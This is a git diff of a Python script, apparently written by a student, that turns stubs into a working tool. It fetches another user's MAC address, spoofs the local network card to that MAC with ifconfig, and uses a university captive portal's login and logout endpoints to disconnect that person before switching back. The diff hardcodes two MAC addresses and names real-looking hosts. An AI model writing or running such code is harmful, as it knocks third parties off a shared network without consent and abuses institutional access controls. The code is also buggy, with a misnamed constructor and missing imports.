@@ -4,6 +4,7 @@ from hashlib import md5
 import hmac
 import datetime as dt
 import re
+import time
 
 from secrets import username, password
 
@@ -12,20 +13,16 @@ BASE_URL = 'http://radsvr2.csis.int/user.php'
 
 class KickUser:
     def __int__(self):
-        self.own_mac_address = ""
-        self.user_mac_address = ""
+        self.own_mac_address = "58:fb:84:15:9c:71"
+        self.user_mac_address = "98:2C:BC:97:6E:45"
         self.cookies = ""
         self.wlan_interface_used = ""
 
     def bounce_the_person(self):
-        #self.get_user_mac()
-        #print(self.user_mac_address)
+        self.get_user_mac()
         self.get_own_mac()
-        print(self.own_mac_address)
-
-    def get_cookies(self):
-        pass
-
+        self.logout_user()
+        self.revert_and_login()
     def get_user_mac(self):
         # encode password in right format and make bytes array
         string_encoded = md5(bytes(password,'utf-8')).hexdigest()
@@ -55,16 +52,28 @@ class KickUser:
         self.own_mac_address = mac_result[0]
 
 
-    def change_mac(self,):
-        pass
-
+    def change_mac(self,change):
+        print("mac is changing")
+        # .call used beause i don't not an output returned
+        subprocess.call(["ifconfig", self.wlan_interface_used, "down"])
+        subprocess.call(["ifconfig", self.wlan_interface_used, "hw", "ether", change])
+        subprocess.call(["ifconfig", self.wlan_interface_used, "up"])
+        
     def logout_user(self):
-        pass
+        self.change_mac(self.user_mac_address)
+        # i noticed it took a while before my system could work properly right after taking down my network card
+        time.sleep(6)
+        #login then logout
+        #logout without login did not work for some strange reason
+        r = requests.post('http://internetlogin1.cu.edu.ng/login', data = dict(username = username , password = password))
+        r = request.get('http://internetlogin1.cu.edu.ng/logout?')
 
     def revert_and_login(self):
-        pass
+        self.change_mac(self.own_mac_address)
+        time.sleep(6)
+        r = requests.post('http://internetlogin1.cu.edu.ng/login', data = dict(username = username , password = password))
 
-
+# TODO add netowrk error handler
 if __name__ == '__main__':
     ku = KickUser()
     ku.bounce_the_person()
